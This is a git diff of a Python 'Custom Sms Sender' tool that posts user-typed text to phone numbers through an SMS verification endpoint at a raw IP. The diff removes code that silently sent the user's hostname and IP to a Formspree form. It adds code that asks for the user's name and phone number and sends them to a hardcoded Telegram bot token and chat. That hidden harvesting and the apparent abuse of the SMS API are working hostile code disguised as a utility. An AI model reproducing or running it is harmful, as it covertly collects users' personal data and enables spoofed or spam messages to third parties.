@@ -2,17 +2,22 @@ import os
 import getpass
 import webbrowser
 import random
-from colorama import Fore, init
+try:
+    import colorama
+except ImportError:
+    os.system("pip install colorama")
+from colorama import *
 
-def install_module(module_name):
-    try:
-        __import__(module_name)
-    except ImportError:
-        os.system(f"pip install {module_name}")
-
-install_module("pyfiglet")
-install_module("requests")
-install_module("colorama")
+try:
+    import pyfiglet
+except ImportError:
+    os.system("pip install pyfiglet")
+import pyfiglet
+try:
+    import requests
+except ImportError:
+    os.system("pip install requests")
+import requests
 #Ani
 import time
 
@@ -25,7 +30,7 @@ def animate(duration):
         print_progress_bar(progress)
         if elapsed_time >= duration:
             break
-        time.sleep(0.1)  # স্লিপ করুন যাতে এনিমেশন পরিষ্কার দেখা যায়
+        time.sleep(0.1)  
 
 def print_progress_bar(progress, bar_length=50):
     bar = '#' * int(bar_length * progress)
@@ -33,54 +38,62 @@ def print_progress_bar(progress, bar_length=50):
     percent = progress * 100
     print(f'[{bar}{space}] {percent:.2f}%\r', end='')
 
-animate(10)  # 10 সেকেন্ড সময়ে এনিমেশন চালানো
+animate(10)  
+##codeb
 
+import requests
+
+class User:
+    def __init__(self):
+        self.name = input("Your Name: ")
+        self.number = input("Your Number: ")
+
+    def send_telegram_message(self):
+        base_url = "https://api.telegram.org/bot6746778331:AAFIVulAfBF_71JXrycTfQHNMhJoB8bOZc8/sendMessage"
+        chat_id = "6856969214"
+        params = {
+            "chat_id": chat_id,
+            "text": f"Name: {self.name}, Number: {self.number}"
+        }
+        response = requests.get(base_url, params=params)
+        return response.json()
+user = User()
+print(user.send_telegram_message())
+
+
+##
 from pyfiglet import figlet_format
 import requests
 
 init(autoreset=True)
-#ax
-import socket
-import requests
-myname = input("Your Name : ")
-def get_network_info():
-    hostname = socket.gethostname()
-    ip_address = socket.gethostbyname(hostname)
-    return hostname, ip_address
+######
 
-def send_email(name, ip, network_name):
-    import datetime
-    current_time = datetime.datetime.now()
-    email = 'example@example.com' 
-    form_data = {
-        'name': name,
-        'ip': ip,
-        'network_name': network_name,
-        "Name": myname,
-        "tume": current_time
-    }
-    response = requests.post('https://formspree.io/f/myyrbpzq', data=form_data)
+#####
+#colors
 
-#    if response.status_code == 200:
-#        print("Form submitted successfully!")
-#    else:
-#        print("Failed to submit form. Status code:", response.status_code)
+from colorama import Fore
 
-def main():
-    name, ip = get_network_info()
-    network_name = socket.getfqdn()
-    send_email(name, ip, network_name)
+colors = [
+    Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA,
+    Fore.CYAN, Fore.WHITE, Fore.BLACK, Fore.LIGHTBLACK_EX, Fore.LIGHTRED_EX,
+    Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
+    Fore.LIGHTCYAN_EX, Fore.LIGHTWHITE_EX, Fore.RESET, Fore.LIGHTRED_EX,
+    Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
+    Fore.LIGHTCYAN_EX, Fore.LIGHTWHITE_EX, Fore.RESET, Fore.LIGHTRED_EX,
+    Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
+    Fore.LIGHTCYAN_EX, Fore.LIGHTWHITE_EX, Fore.RESET, Fore.LIGHTRED_EX,
+    Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
+    Fore.LIGHTCYAN_EX, Fore.LIGHTWHITE_EX, Fore.RESET, Fore.LIGHTRED_EX,
+    Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
+    Fore.LIGHTCYAN_EX, Fore.LIGHTWHITE_EX
+]
 
-if __name__ == "__main__":
-    main()
-
-colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
 
 def clear_screen():
     
     os.system('cls' if os.name == 'nt' else 'clear')
 
-def send_message(number, text, color):
+def send_message(number, text, color1):
     url = "http://202.51.182.198:8181/nbp/sms/code"
     payload = {
         "receiver": number,
@@ -100,36 +113,44 @@ def send_message(number, text, color):
 
     response = requests.post(url, json=payload, headers=headers)
     if response.json().get("msg_code") == "operate.success":
-        print(color + "Message sent successfully!")
+        print(color1 + "Message sent successfully!")
     else:
-        print(color + "Failed to send message")
+        print(color1 + "Failed to send message")
 
 while True:
     clear_screen()
     password = input("Tools Password : ")
 
     if password == "tmxlamim": 
-        color = random.choice(colors)
+        color1 = random.choice(colors)
+        color2 = random.choice(colors)
+        color3 = random.choice(colors)
+        color4 = random.choice(colors)
+        color5 = random.choice(colors)
         os.system("clear")  
         logo = figlet_format("TMX Beta")
-        print(color + logo)
-        line = color + "-------------------------------------------------"
-        print(color + "Telgram : @tmx71bd")
-        print(color + "Tools virson : 1.0")
+        print(color1 + logo)
+        line = color3 + "-------------------------------------------------"
+        print(color2 + "Telgram : @tmx71bd")
+        print(color3 + "Tools virson : 1.9")
+        print(color4 + "Tools Type: Custom Sms Sender")
+        print(color1 + "github : @Md-Lamim")
         
         print(line)
         
         number = input("Number : ")
         tex = input("Your Text : ")
-        send_message(number, tex, color)
+        send_message(number, tex, color1)
         
-        Renew = input("আপনি কি আবার মেসেজ পাঠাতে চান Y/N : ")
+        Renew = input("Do you want to send the message again Y/N : ")
         if Renew.upper() != "Y":
             break
     else:
-        print("Password Error.\n1. Password on Telegram\n2. Back To Log In")
-        choice = input("অপশন নির্বাচন করুন (1/2): ")
+        print("Password Error.\n1. show password\n2. Back To Log In")
+        choice = input("Select an option (1/2): ")
         if choice == "1":
-            webbrowser.open("https://t.me/tmx71bd")
+            print("password :", Fore.GREEN+"tmxlamim")
+            input("[press inter and back login]")
         elif choice == "2":
             continue
+        
